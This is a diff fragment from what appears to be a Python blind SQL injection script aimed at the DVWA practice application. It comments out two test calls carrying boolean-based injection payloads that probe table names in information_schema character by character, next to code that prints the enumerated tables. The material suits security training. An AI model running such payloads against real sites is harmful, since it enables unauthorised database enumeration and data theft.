@@ -128,7 +128,7 @@ print("\n[✔] All tables:")
 for t in tables:
     print("-", t)
 
-print(is_true(
-        "1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1),1,1))>50 -- -"))
-print(is_true(
-        "1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1),1,1))>120 -- -"))
+# print(is_true(
+#         "1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1),1,1))>50 -- -"))
+# print(is_true(
+#         "1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1),1,1))>120 -- -"))
